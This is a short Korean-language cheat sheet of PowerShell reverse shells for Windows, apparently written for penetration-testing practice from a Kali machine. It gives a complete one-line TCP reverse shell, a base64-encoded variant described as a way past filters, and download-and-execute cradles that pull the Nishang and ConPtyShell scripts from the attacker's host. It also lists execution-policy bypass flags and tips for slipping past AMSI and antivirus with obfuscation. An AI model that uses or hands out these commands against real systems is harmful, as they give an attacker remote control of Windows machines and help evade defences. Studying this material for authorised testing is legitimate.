# powershell

# 리버스쉘 — PowerShell (Windows)

---

## 기본 (한 줄)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<칼리IP>',4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex$data 2>&1 | Out-String );$sendback2 =$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## base64 인코딩 버전 (필터 우회)

```bash
# 칼리에서 인코딩 생성
$cmd = '$client = New-Object System.Net.Sockets.TCPClient("<칼리IP>",4444);...'
echo $cmd | iconv -t UTF-16LE | base64 -w0
```

```bash
powershell -enc <base64결과>
```

---

## Nishang — Invoke-PowerShellTcp

```powershell
# 메모리에서 직접 로드 + 실행
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress <칼리IP> -Port 4444
```

---

## PowerShell 실행 정책 우회

```bash
powershell -ep bypass
powershell -ExecutionPolicy Bypass
powershell -ExecutionPolicy Unrestricted
powershell -nop -ep bypass -c "..."
```

---

## ConPtyShell (완전한 인터랙티브 쉘)

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell <칼리IP> 4444
```

---

## cmd에서 PowerShell 실행

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient..."
```

---

## 팁

- AMSI/AV 탐지 시 base64 인코딩, 난독화 필요
- 443, 80, 8080 포트가 방화벽 통과 유리
- `rlwrap nc -lvnp 4444` 로 리스너 열면 편함